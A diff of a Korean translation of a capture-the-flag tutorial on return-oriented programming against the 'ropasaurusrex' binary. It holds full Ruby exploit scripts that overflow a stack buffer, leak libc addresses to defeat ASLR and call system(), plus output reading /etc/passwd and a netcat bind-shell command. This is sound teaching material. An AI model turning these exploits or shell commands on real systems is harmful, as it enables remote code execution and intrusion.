@@ -74,7 +74,7 @@ ROP를 이용하면 실행 가능한 메모리 영역(executable memory)에 이�
 <!-- The simple idea is, let's say function `A()` calls function `B()` with two parameters, 1 and 2. Then `B()` calls `C()` with two parameters, 3 and 4. When you're in `C()`, the stack looks like this: -->
 이 간단한 아이디어를 설명하자면, 함수 `A()`가 함수 `B()`를 두 개의 인자 1, 2와 함께 호출한다고 하자. 그리고 `B()`는 `C()`를 두 개의 인자 3, 4와 함께 호출한다고 하자. `C()`가 실행 중일 때, 스택은 이렇게 보일 것이다:
 
-<!-- ```text
+<!-- ``` text
 +----------------------+
 |         ...          | (higher addresses)
 +----------------------+
@@ -296,23 +296,6 @@ ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 �
 <!-- Here's the vulnerable function, fresh from IDA: -->
 여기 IDA에서 갓 뽑은 취약한 함수다:
 
-<!-- ```
-.text:080483F4vulnerable_function proc near
-.text:080483F4
-.text:080483F4buf             = byte ptr -88h
-.text:080483F4
-.text:080483F4         push    ebp
-.text:080483F5         mov     ebp, esp
-.text:080483F7         sub     esp, 98h
-.text:080483FD         mov     dword ptr [esp+8], 100h ; nbytes
-.text:08048405         lea     eax, [ebp+buf]
-.text:0804840B         mov     [esp+4], eax    ; buf
-.text:0804840F         mov     dword ptr [esp], 0 ; fd
-.text:08048416         call    _read
-.text:0804841B         leave
-.text:0804841C         retn
-.text:0804841Cvulnerable_function endp
-``` -->
 ```
 .text:080483F4vulnerable_function proc near
 .text:080483F4
@@ -334,13 +317,6 @@ ROP를 이해하기 위해 이해해야 하는 가장 중요한 건: 함수의 �
 <!-- Now, if you don't know assembly, this might look daunting. But, in fact, it's simple. Here's the equivalent C: -->
 어셈블리를 모른다면, 좀 벅차보일 것이다. 하지만 사실 간단하다. 같은 함수의 C 코드다:
 
-<!-- ``` c
-ssize_t __cdecl vulnerable_function()
-{
-  char buf[136];
-  return read(0, buf, 256);
-}
-``` -->
 ``` c
 ssize_t __cdecl vulnerable_function()
 {
@@ -355,16 +331,6 @@ ssize_t __cdecl vulnerable_function()
 <!-- You can easily validate that by running it, piping in a bunch of 'A's, and seeing what happens: -->
 이걸 실행함으로써 쉽게 확인할 수 있다. 'A' 뭉치를 파이프로 넣고, 어떻게 되는지 보자:
 
-<!-- ``` sh
-ron@debian-x86 ~ $ ulimit -c unlimited
-ron@debian-x86 ~ $ perl -e "print 'A'x300" | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb)
-``` -->
 ``` sh
 ron@debian-x86 ~ $ ulimit -c unlimited
 ron@debian-x86 ~ $ perl -e "print 'A'x300" | ./ropasaurusrex
@@ -382,12 +348,6 @@ Program terminated with signal 11, Segmentation fault.
 <!-- Now, there are good ways and bad ways to figure out exactly what you control. I used a bad way. I put "BBBB" at the end of my buffer and simply removed 'A's until it crashed at `0x42424242` ("BBBB"): -->
 이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 "BBBB"를 넣고 `0x42424242`("BBBB")에서 크래시를 일으킬 때까지 'A'를 지웠다.
 
-<!-- ``` sh
-ron@debian-x86 ~ $ perl -e "print 'A'x140;print 'BBBB'" | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-#0  0x42424242 in ?? ()
-``` -->
 ``` sh
 ron@debian-x86 ~ $ perl -e "print 'A'x140;print 'BBBB'" | ./ropasaurusrex
 Segmentation fault (core dumped)
@@ -410,10 +370,6 @@ ron@debian-x86 ~ $ gdb ./ropasaurusrex core
 [xinetd]: https://en.wikipedia.org/wiki/Xinetd
 [netcat]: https://en.wikipedia.org/wiki/Netcat
 
-<!-- ``` sh
-$ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
-listening on [any] 4444 ...
-``` -->
 ``` sh
 $ while true; do nc -vv -l -p 4444 -e ./ropasaurusrex; done
 listening on [any] 4444 ...
@@ -425,9 +381,6 @@ listening on [any] 4444 ...
 <!-- You may also want to disable ASLR if you're following along: -->
 ASLR을 끄고 싶다면:
 
-<!-- ``` sh
-$ sudo sysctl -w kernel.randomize_va_space=0
-``` -->
 ``` sh
 $ sudo sysctl -w kernel.randomize_va_space=0
 ```
@@ -438,21 +391,6 @@ $ sudo sysctl -w kernel.randomize_va_space=0
 <!-- Here's some ruby code for the initial exploit: -->
 초반 익스플로잇을 위한 루비 코드다:
 
-<!-- ``` ruby
-require 'socket'
-
-$ cat ./sploit.rb
-s = TCPSocket.new("localhost", 4444)
-
-# Generate the payload
-payload = "A"*140 +
-  [
-    0x42424242,
-  ].pack("I*") # Convert a series of 'ints' to a string
-
-s.write(payload)
-s.close()
-``` -->
 ``` ruby
 $ cat ./sploit.rb
 require 'socket'
@@ -472,10 +410,6 @@ s.close()
 <!-- Run that with `ruby ./sploit.rb` and you should see the service crash: -->
 `ruby ./sploit.rb`를 통해 실행시키면 서비스 크래시를 볼 것이다:
 
-<!-- ``` sh
-connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451
-Segmentation fault (core dumped)
-``` -->
 ``` sh
 connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53451
 Segmentation fault (core dumped)
@@ -484,12 +418,6 @@ Segmentation fault (core dumped)
 <!-- And you can verify, using gdb, that it crashed at the right location: -->
 그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:
 
-<!-- ``` sh
-gdb --quiet ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x42424242 in ?? ()
-``` -->
 ``` sh
 gdb --quiet ./ropasaurusrex core
 [...]
@@ -538,12 +466,6 @@ Program terminated with signal 11, Segmentation fault.
 
 [.data]: https://en.wikipedia.org/wiki/Data_segment
 
-<!-- ``` sh
-ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 '\.data'
- 23 .data         00000008  08049620  08049620  00000620  2**2
-                   CONTENTS, ALLOC, LOAD, DATA
-
-``` -->
 ``` sh
 ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 '\.data'
  23 .data         00000008  08049620  08049620  00000620  2**2
@@ -554,11 +476,6 @@ ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 '\.data'
 <!-- Uh oh, .data is only 8 bytes long. That's not enough! In theory, any address that's long enough, writable, and not used will be enough for what we need. Looking at the output for `objdump -x`, I see a section called .dynamic that seems to fit the bill: -->
 오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. `objdump -x`의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.
 
-<!-- ``` sh
-
- 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
-                   CONTENTS, ALLOC, LOAD, DATA
-``` -->
 ``` sh
 
  20 .dynamic      000000d0  08049530  08049530  00000530  2**2
@@ -571,19 +488,6 @@ ron@debian-x86 ~ $ objdump -x ropasaurusrex  | grep -A1 '\.data'
 <!-- The next step is to find a function that can write our command string to address `0x08049530`. The most convenient functions to use are the ones that are in the executable itself, rather than a library, since the functions in the executable won't change from system to system. Let's look at what we have: -->
 다음 단계는 주소 `0x08049530`에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:
 
-<!-- ``` sh
-ron@debian-x86 ~ $ objdump -R ropasaurusrex
-
-ropasaurusrex:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049600 R_386_GLOB_DAT    __gmon_start__
-08049610 R_386_JUMP_SLOT   __gmon_start__
-08049614 R_386_JUMP_SLOT   write
-08049618 R_386_JUMP_SLOT   __libc_start_main
-0804961c R_386_JUMP_SLOT   read
-``` -->
 ``` sh
 ron@debian-x86 ~ $ objdump -R ropasaurusrex
 
@@ -601,9 +505,6 @@ OFFSET   TYPE              VALUE
 <!-- So, we have `read()` and `write()` immediately available. That's helpful! The `read()` function will read data from the socket and write it to memory. The prototype looks like this: -->
 즉시 사용 가능한 `read()`와 `write()`를 찾았다. 이건 유용하다! `read()` 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:
 
-<!-- ``` c
-ssize_t read(int fd, void *buf, size_t count);
-``` -->
 ``` c
 ssize_t read(int fd, void *buf, size_t count);
 ```
@@ -653,43 +554,6 @@ ssize_t read(int fd, void *buf, size_t count);
 <!-- We update our exploit to look like this (explanations are in the comments): -->
 익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):
 
-<!-- ``` ruby
-$ cat sploit.rb
-require 'socket'
-
-s = TCPSocket.new("localhost", 4444)
-
-# The command we'll run
-cmd = ARGV[0] + "\0"
-
-# From objdump -x
-buf = 0x08049530
-
-# From objdump -D ./ropasaurusrex | grep read
-read_addr = 0x0804832C
-# From objdump -D ./ropasaurusrex | grep write
-write_addr = 0x0804830C
-
-# Generate the payload
-payload = "A"*140 +
-  [
-    cmd.length, # number of bytes
-    buf,        # writable memory
-    0,          # stdin
-    0x43434343, # read's return address
-
-    read_addr # Overwrite the original return
-  ].reverse.pack("I*") # Convert a series of 'ints' to a string
-
-# Write the 'exploit' payload
-s.write(payload)
-
-# When our payload calls read() the first time, this is read
-s.write(cmd)
-
-# Clean up
-s.close()
-``` -->
 ``` ruby
 $ cat sploit.rb
 require 'socket'
@@ -731,9 +595,6 @@ s.close()
 <!-- We run that against the target: -->
 공격 대상에 실행해 보자:
 
-<!-- ``` sh
-ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
-``` -->
 ``` sh
 ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
 ```
@@ -741,11 +602,6 @@ ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
 <!-- And verify that it crashes: -->
 그리고 크래시를 일으키는 걸 확인해라:
 
-<!-- ``` sh
-listening on [any] 4444 ...
-connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456
-Segmentation fault (core dumped)
-``` -->
 ``` sh
 listening on [any] 4444 ...
 connect to [127.0.0.1] from debian-x86.skullseclabs.org [127.0.0.1] 53456
@@ -755,14 +611,6 @@ Segmentation fault (core dumped)
 <!-- Then verify that it crashed at the return address of `read()` (`0x43434343`) and wrote the command to the memory at `0x08049530`: -->
 그게 `read()`의 반환 주소(`0x43434343`)에서 크래시를 일으켰고 명령어를 메모리 `0x08049530`에 썼다는 걸 확인해라:
 
-<!-- ``` sh
-$ gdb --quiet ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x43434343 in ?? ()
-(gdb) x/s 0x08049530
-0x8049530:       "cat /etc/passwd"
-``` -->
 ``` sh
 $ gdb --quiet ./ropasaurusrex core
 [...]
@@ -781,12 +629,6 @@ Program terminated with signal 11, Segmentation fault.
 <!-- Now that we've written `cat /etc/passwd` into memory, we need to call `system()` and point it at that address. It turns out, if we assume ASLR is off, this is easy. We know that the executable is linked with libc: -->
 이제 우린 `cat /etc/passwd`를 메모리에 썼고, `system()`을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:
 
-<!-- ``` sh
-$ ldd ./ropasaurusrex
-        linux-gate.so.1 =>  (0xb7703000)
-        libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb75aa000)
-        /lib/ld-linux.so.2 (0xb7704000)
-``` -->
 ``` sh
 $ ldd ./ropasaurusrex
         linux-gate.so.1 =>  (0xb7703000)
@@ -797,12 +639,6 @@ $ ldd ./ropasaurusrex
 <!-- And `libc.so.6` contains the `system()` function: -->
 그리고 `libc.so.6`엔 `system()` 함수가 포함되어 있다:
 
-<!-- ``` sh
-$ objdump -T /lib/i686/cmov/libc.so.6 | grep system
-000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
-00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
-00039450  w   DF .text  0000007d  GLIBC_2.0   system
-``` -->
 ``` sh
 $ objdump -T /lib/i686/cmov/libc.so.6 | grep system
 000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
@@ -813,14 +649,6 @@ $ objdump -T /lib/i686/cmov/libc.so.6 | grep system
 <!-- We can figure out the address where `system()` ends up loaded in ropasaurusrex in our debugger: -->
 디버거를 통해 ropasaurusrex에서 로드된 `system()` 주소를 알아낼 수 있다:
 
-<!-- ``` sh
-$ gdb --quiet ./ropasaurusrex core
-[...]
-Program terminated with signal 11, Segmentation fault.
-#0  0x43434343 in ?? ()
-(gdb) x/x system
-0xb7ec2450 <system>:    0x890cec83
-``` -->
 ``` sh
 $ gdb --quiet ./ropasaurusrex core
 [...]
@@ -1163,15 +991,6 @@ Program terminated with signal 11, Segmentation fault.
 <!-- Finding a `pop/pop/pop/ret` is pretty easy using `objdump`: -->
 `pop/pop/pop/ret`은 `objdump`를 이용하면 어렵지 않게 찾을 수 있다:
 
-<!-- ``` sh
-$ objdump -d ./ropasaurusrex | egrep 'pop|ret'
-[...]
- 80484b5:       5b                      pop    ebx
- 80484b6:       5e                      pop    esi
- 80484b7:       5f                      pop    edi
- 80484b8:       5d                      pop    ebp
- 80484b9:       c3                      ret
-``` -->
 ``` sh
 $ objdump -d ./ropasaurusrex | egrep 'pop|ret'
 [...]
@@ -1253,57 +1072,6 @@ $ objdump -d ./ropasaurusrex | egrep 'pop|ret'
 <!-- We also update our exploit with a `s.read()` at the end, to read whatever data the remote server sends us. The current exploit now looks like: -->
 원격 서버에서 보내는 걸 받기 위해 `s.read()`를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:
 
-<!-- ``` ruby
-require 'socket'
-
-s = TCPSocket.new("localhost", 4444)
-
-# The command we'll run
-cmd = ARGV[0] + "\0"
-
-# From objdump -x
-buf = 0x08049530
-
-# From objdump -D ./ropasaurusrex | grep read
-read_addr = 0x0804832C
-# From objdump -D ./ropasaurusrex | grep write
-write_addr = 0x0804830C
-# From gdb, "x/x system"
-system_addr = 0xb7ec2450
-# From objdump, "pop/pop/pop/ret"
-pppr_addr = 0x080484b6
-
-# Generate the payload
-payload = "A"*140 +
-  [
-    # system()'s stack frame
-    buf,         # writable memory (cmd buf)
-    0x44444444,  # system()'s return address
-
-    # pop/pop/pop/ret's stack frame
-    system_addr, # pop/pop/pop/ret's return address
-
-    # read()'s stack frame
-    cmd.length,  # number of bytes
-    buf,         # writable memory (cmd buf)
-    0,           # stdin
-    pppr_addr,   # read()'s return address
-
-    read_addr # Overwrite the original return
-  ].reverse.pack("I*") # Convert a series of 'ints' to a string
-
-# Write the 'exploit' payload
-s.write(payload)
-
-# When our payload calls read() the first time, this is read
-s.write(cmd)
-
-# Read the response from the command and print it to the screen
-puts(s.read)
-
-# Clean up
-s.close()
-``` -->
 ``` ruby
 require 'socket'
 
@@ -1359,13 +1127,6 @@ s.close()
 <!-- And when we run it, we get the expected result: -->
 그리고 실행하게 되면, 예상대로 나온다:
 
-<!-- ``` sh
-$ ruby sploit.rb "cat /etc/passwd"
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-...
-``` -->
 ``` sh
 $ ruby sploit.rb "cat /etc/passwd"
 root:x:0:0:root:/root:/bin/bash
@@ -1388,11 +1149,6 @@ bin:x:2:2:bin:/bin:/bin/sh
 <!-- This exploit worked perfectly against my test machine, but when ASLR is enabled, it failed: -->
 이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:
 
-<!-- ``` sh
-$ sudo sysctl -w kernel.randomize_va_space=1
-kernel.randomize_va_space = 1
-ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
-``` -->
 ``` sh
 $ sudo sysctl -w kernel.randomize_va_space=1
 kernel.randomize_va_space = 1
@@ -1408,23 +1164,6 @@ ron@debian-x86 ~ $ ruby sploit.rb "cat /etc/passwd"
 <!-- ASLR---or address space layout randomization---is a defense implemented on all modern systems (except for FreeBSD) that randomizes the address that libraries are loaded at. As an example, let's run ropasaurusrex twice and get the address of `system()`: -->
 ASLR---주소 공간 레이아웃 불규칙화(address space layout randomization)---은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 `system()`의 주소를 알아내 보자:
 
-<!-- ``` sh
-ron@debian-x86 ~ $ perl -e 'printf "A"x1000' | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-Program terminated with signal 11, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb) x/x system
-0xb766e450 <system>:    0x890cec83
-
-ron@debian-x86 ~ $ perl -e 'printf "A"x1000' | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-Program terminated with signal 11, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb) x/x system
-0xb76a7450 <system>:    0x890cec83
-``` -->
 ``` sh
 ron@debian-x86 ~ $ perl -e 'printf "A"x1000' | ./ropasaurusrex
 Segmentation fault (core dumped)
@@ -1452,19 +1191,6 @@ Program terminated with signal 11, Segmentation fault.
 <!-- So, what do we know? Well, the binary itself isn't ASLRed, which means that we can rely on every address in it to stay put, which is useful. Most importantly, the relocation table will remain at the same address: -->
 그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:
 
-<!-- ``` sh
-$ objdump -R ./ropasaurusrex
-
-./ropasaurusrex:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049600 R_386_GLOB_DAT    __gmon_start__
-08049610 R_386_JUMP_SLOT   __gmon_start__
-08049614 R_386_JUMP_SLOT   write
-08049618 R_386_JUMP_SLOT   __libc_start_main
-0804961c R_386_JUMP_SLOT   read
-``` -->
 ``` sh
 $ objdump -R ./ropasaurusrex
 
@@ -1482,17 +1208,6 @@ OFFSET   TYPE              VALUE
 <!-- So we know the address---in the binary---of `read()` and `write()`. What's that mean? Let's take a look at their values while the binary is running: -->
 이렇게 `read()`와 `write()`의 주소---바이너리 안에 있는---를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:
 
-<!-- ``` sh
-$ gdb ./ropasaurusrex
-(gdb) run
-^C
-Program received signal SIGINT, Interrupt.
-0xb7fe2424 in __kernel_vsyscall ()
-(gdb) x/x 0x0804961c
-0x804961c:      0xb7f48110
-(gdb) print read
-$1 = {<text variable, no debug info>} 0xb7f48110 <read>
-``` -->
 ``` sh
 $ gdb ./ropasaurusrex
 (gdb) run
@@ -1662,10 +1377,6 @@ $1 = {<text variable, no debug info>} 0xb7f48110 <read>
 <!-- Frame [5] reads another address over the socket and writes it to memory. This address is going to be the address of the `system()` call. The reason writing it to memory works is because of how `read()` is called. Take a look at the `read()` call we've been using in gdb (`0x0804832C`) and you'll see this: -->
 프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 `system()` 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 `read()`가 호출되는 방식 때문이다. 우리가 gdb (`0x0804832C`)에서 써 왔던 `read()` 호출 부분을 보면 이렇다:
 
-<!-- ``` sh
-(gdb) x/i 0x0804832C
-0x804832c <read@plt>:   jmp    DWORD PTR ds:0x804961c
-``` -->
 ``` sh
 (gdb) x/i 0x0804832C
 0x804832c <read@plt>:   jmp    DWORD PTR ds:0x804961c
@@ -1683,103 +1394,6 @@ $1 = {<text variable, no debug info>} 0xb7f48110 <read>
 <!-- Whew! That's quite complicated. Here's code that implements the full exploit for ropasaurusrex, bypassing both DEP and ASLR: -->
 휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:
 
-<!-- ``` ruby
-require 'socket'
-
-s = TCPSocket.new("localhost", 4444)
-
-# The command we'll run
-cmd = ARGV[0] + "\0"
-
-# From objdump -x
-buf = 0x08049530
-
-# From objdump -D ./ropasaurusrex | grep read
-read_addr = 0x0804832C
-# From objdump -D ./ropasaurusrex | grep write
-write_addr = 0x0804830C
-# From gdb, "x/x system"
-system_addr = 0xb7ec2450
-# Fram objdump, "pop/pop/pop/ret"
-pppr_addr = 0x080484b6
-
-# The location where read()'s .plt entry is
-read_addr_ptr = 0x0804961c
-
-# The difference between read() and system()
-# Calculated as  read (0xb7f48110) - system (0xb7ec2450)
-# Note: This is the one number that needs to be calculated using the
-# target version of libc rather than my own!
-read_system_diff = 0x85cc0
-
-# Generate the payload
-payload = "A"*140 +
-  [
-    # system()'s stack frame
-    buf,         # writable memory (cmd buf)
-    0x44444444,  # system()'s return address
-
-    # pop/pop/pop/ret's stack frame
-    # Note that this calls read_addr, which is overwritten by a pointer
-    # to system() in the previous stack frame
-    read_addr,   # (this will become system())
-
-    # second read()'s stack frame
-    # This reads the address of system() from the socket and overwrites
-    # read()'s .plt entry with it, so calls to read() end up going to
-    # system()
-    4,           # length of an address
-    read_addr_ptr, # address of read()'s .plt entry
-    0,           # stdin
-    pppr_addr,   # read()'s return address
-
-    # pop/pop/pop/ret's stack frame
-    read_addr,
-
-    # write()'s stack frame
-    # This frame gets the address of the read() function from the .plt
-    # entry and writes to to stdout
-    4,           # length of an address
-    read_addr_ptr, # address of read()'s .plt entry
-    1,           # stdout
-    pppr_addr,   # retrurn address
-
-    # pop/pop/pop/ret's stack frame
-    write_addr,
-
-    # read()'s stack frame
-    # This reads the command we want to run from the socket and puts it
-    # in our writable "buf"
-    cmd.length,  # number of bytes
-    buf,         # writable memory (cmd buf)
-    0,           # stdin
-    pppr_addr,   # read()'s return address
-
-    read_addr # Overwrite the original return
-  ].reverse.pack("I*") # Convert a series of 'ints' to a string
-
-# Write the 'exploit' payload
-s.write(payload)
-
-# When our payload calls read() the first time, this is read
-s.write(cmd)
-
-# Get the result of the first read() call, which is the actual address of read
-this_read_addr = s.read(4).unpack("I").first
-
-# Calculate the address of system()
-this_system_addr = this_read_addr - read_system_diff
-
-# Write the address back, where it'll be read() into the correct place by
-# the second read() call
-s.write([this_system_addr].pack("I"))
-
-# Finally, read the result of the actual command
-puts(s.read())
-
-# Clean up
-s.close()
-``` -->
 ``` ruby
 require 'socket'
 
@@ -1881,14 +1495,6 @@ s.close()
 <!-- And here it is in action: -->
 그리고 실행 결과다:
 
-<!-- ``` sh
-$ ruby sploit.rb "cat /etc/passwd"
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-[...]
-``` -->
 ``` sh
 $ ruby sploit.rb "cat /etc/passwd"
 root:x:0:0:root:/root:/bin/bash
@@ -1901,20 +1507,6 @@ sys:x:3:3:sys:/dev:/bin/sh
 <!-- You can, of course, change `cat /etc/passwd` to anything you want (including a netcat listener!) -->
 물론 `cat /etc/passwd`를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).
 
-<!-- ``` sh
-ron@debian-x86 ~ $ ruby sploit.rb "pwd"
-/home/ron
-ron@debian-x86 ~ $ ruby sploit.rb "whoami"
-ron
-ron@debian-x86 ~ $ ruby sploit.rb "nc -vv -l -p 5555 -e /bin/sh" &
-[1] 3015
-ron@debian-x86 ~ $ nc -vv localhost 5555
-debian-x86.skullseclabs.org [127.0.0.1] 5555 (?) open
-pwd
-/home/ron
-whoami
-ron
-``` -->
 ``` sh
 ron@debian-x86 ~ $ ruby sploit.rb "pwd"
 /home/ron
